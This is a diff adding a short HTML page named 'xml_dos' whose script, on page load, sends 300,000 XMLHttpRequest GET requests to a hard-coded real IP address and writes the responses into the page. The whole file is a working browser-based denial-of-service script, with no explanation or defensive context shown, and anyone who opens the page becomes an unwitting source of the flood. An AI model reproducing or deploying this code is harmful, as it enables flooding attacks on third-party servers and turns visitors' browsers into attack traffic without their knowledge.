@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>xml_dos</title>
+	</head>
+	<body>
+		<script>
+			function xml_dos(power, url) {
+					for (i=1; i<=power; i++) {
+						x = new XMLHttpRequest;
+
+						x.onload = function() {
+							document.write(this.responseText)
+						};
+
+						x.open('GET', url);
+						x.send();
+					}
+			}
+
+			xml_dos(300000, 'http://88.198.48.45');
+		</script>
+	</body>
+</html>
